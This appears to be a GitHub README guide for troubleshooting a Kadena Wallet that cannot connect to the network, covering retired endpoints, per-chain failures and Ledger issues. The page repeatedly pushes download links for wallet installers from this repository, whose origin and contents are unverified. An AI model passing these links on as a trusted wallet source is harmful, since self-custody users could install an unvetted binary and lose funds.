![Kadena Wallet](assets/banner-article.png)

<h1 align="center">Kadena Wallet Cannot Reach the Network: What to Check</h1>

<p align="center">A Kadena Wallet guide to accounts, chains and transfers.</p>

<p align="center"><a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-94D3BF?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Windows" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-94D3BF?style=for-the-badge&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="Download for macOS" /></a> <a href="https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-94D3BF?style=for-the-badge&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

> Only download from this GitHub release page.

"Cannot connect" is a message about the path between your wallet and a node, not a statement about your funds. The chain is producing blocks whether or not your interface can see them, and the fix is almost always an address, a browser permission or an old endpoint rather than anything to do with keys.

Working out which of those it is takes about two minutes if you test in the right order.

## You'll see this if

- The wallet shows a spinner, an empty state or an error instead of balances.
- A balance that existed yesterday is replaced by a warning about the network.
- A tool or script that used to work now fails without a useful message.
- Everything works on one machine and fails on another.

## What the message actually covers

Five different faults produce the same complaint, and they are not related.

| Fault | What fails | How to recognise it |
| --- | --- | --- |
| Dead endpoint | The host the wallet was built against no longer answers | The error appears instantly, or the request times out |
| Local network | Your connection, DNS or firewall | Other sites also fail |
| Browser restriction | Permission for the page or the device | Works in another browser |
| Wrong chain | The node answers but has no data for that chain | Other chains show balances |
| Device connection | The hardware wallet is not reachable | Only signing fails, reading works |

The first row is by far the most common in 2026, because the host most pre-2025 software points at has been retired.

## The endpoint question

Kadena's own API host stopped answering after the company wound down. Software built before that keeps trying it, and the result looks like a broken wallet rather than a moved service.

The community endpoint answers and reports its version, which is the quickest way to confirm the network side is healthy. The old explorer is also gone, and the community explorer is the replacement.

If your wallet lets you choose an endpoint, point it at a working one. If it does not, that is a limitation of the wallet rather than of the network, and it is worth knowing before you spend an evening reinstalling.

## The test that isolates the problem

1. **Load a community explorer.** If it renders balances, the network is reachable from your machine and the wallet is the problem.
2. **Try a second chain** in the wallet. If one chain works, the endpoint is partially reachable and the issue is chain-specific.
3. **Open a second browser.** Permissions and extensions differ, and this separates a page problem from a system problem.
4. **Check whether a device is involved.** Reading balances does not need a hardware wallet; signing does.
5. **Try another network** briefly, only to test. If everything fails there too, the fault is local.
6. **Read the error text** rather than dismissing it. A timeout and a refused connection mean different things.

Steps one and two settle most cases, and neither changes anything.

## When it is a hardware wallet

A Ledger adds a second connection that has nothing to do with the network: the browser has to be allowed to talk to the device.

- Close other software that may be holding the device, including the vendor's own manager.
- Put the device on its Kadena app first, so it is waiting rather than idle.
- Use a direct cable rather than a hub.
- Approve the browser's device prompt, and only for a page you trust.

If balances load but signing fails, the network is fine and the device path is not. If nothing loads at all, the network path is the first suspect.

## When it is one chain only

Kadena has twenty chains, and a per-chain request can fail while the others succeed. That produces a confusing state where some balances appear and one does not.

Check the chain in an explorer before assuming a wallet fault. If the explorer shows the balance on that chain, the wallet's request for that chain is failing, and switching chains or endpoints is the workaround until the wallet is updated.

## What not to do

- **Do not disable browser protections** to make a connection work. Every guide that suggests it is trading your keys for convenience.
- **Do not re-import your phrase** as a first response. A connection fault has nothing to do with your key, and typing the phrase again is pure added risk.
- **Do not reinstall repeatedly.** If the endpoint is retired, a clean install reproduces the same failure with more steps.
- **Do not accept remote help** from anyone who offers to connect to your machine. That pattern ends with a drained wallet.

## When it is not your wallet

Sometimes the network side really is degraded, and the honest test is external. If the community explorer fails from two networks, the problem is upstream of you.

In that case the useful actions are to wait, to check whether a newer release exists, and to avoid concluding anything about your balance. A node that cannot answer is not evidence that funds moved.

## A note on older tools and scripts

Anything written before the 2025 change that hardcodes the company API host will fail, and many such tools are still published. The correction is a single host change in most cases, and the version reported by the community endpoint tells you whether the tool's assumptions still hold.

That is also why a script can work for months and then stop without any change on your side: the host it trusted moved, and nothing announced it to the script.

## FAQ

**Is my KDA safe while the wallet cannot connect?**
Yes. A display or connection fault does not move funds. Confirm with an explorer if you want independent evidence.

**Why does the wallet work on my phone but not my laptop?**
Different endpoints, different browser permissions, or a local firewall. The wallet build and the network are usually identical.

**Do I need a specific port open?**
Ordinary HTTPS access is enough for a hosted endpoint. A local node needs its own configuration, which is a separate exercise.

**Does re-importing the phrase fix connection errors?**
Almost never, and it adds exposure. Diagnose the endpoint first.

**How do I know the endpoint is current?**
It answers, and it reports a node version consistent with the latest community release. An endpoint that times out is not a candidate.

## Related reading

- Community Edition of Kadena, explained
- Why your KDA balance shows zero, and where it really is
- Ledger and KDA: setup, paths and the Ledger Live gap
- Choosing a chain in Kadena Wallet: why balances differ

---

## Download Kadena Wallet

Kadena Wallet is a self-custody desktop wallet for KDA on Chainweb, published for Windows, macOS and Linux.

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-94D3BF?style=flat-square&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0id2hpdGUiIGQ9Ik0wIDNsMTAtMXYxMEgwek0xMSAybDEzLTJ2MTJIMTF6TTAgMTNoMTB2MTBsLTEwLTF6TTExIDEzaDEzdjExbC0xMy0yeiIvPjwvc3ZnPg%3D%3D&logoColor=FFFFFF&labelColor=0C1322" alt="Windows" /> | Windows 10 (1909) or later, 64-bit | [`kadena-wallet-v-1.3.12.exe`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-94D3BF?style=flat-square&logo=apple&logoColor=FFFFFF&labelColor=0C1322" alt="macOS" /> | macOS 12 or later | [`kadena-wallet-v-1.3.12.dmg`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-94D3BF?style=flat-square&logo=linux&logoColor=FFFFFF&labelColor=0C1322" alt="Linux" /> | x64, Ubuntu 20.04 or later, or equivalent | [`kadena-wallet-v-1.3.12.zip`](https://github.com/kadena-developments/kadena-desktop-wallet/releases/download/v-1.3.12/kadena-wallet-v-1.3.12.zip) |

</div>

All versions, file sizes and checksums are on the [release page](https://github.com/kadena-developments/kadena-desktop-wallet/releases/tag/v-1.3.12).

## Related guides

- [What a KDA Transaction Costs, and Why a Send Fails](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/kadena-transaction-fees-explained.md)
- [Legacy Accounts and k: Addresses: Why Both Still Exist](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/legacy-account-vs-k-address-in-kadena-wallet.md)
- [Multisig Accounts in Kadena Wallet: w: Keysets Explained](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/kadena-multisig-account-in-wallet.md)

---

Part of the [Kadena Wallet guides](https://github.com/kadena-developments/troubleshooting-essentials/blob/main/README.md). Main application: [kadena-desktop-wallet](https://github.com/kadena-developments/kadena-desktop-wallet). Licence: BSD-3-Clause.
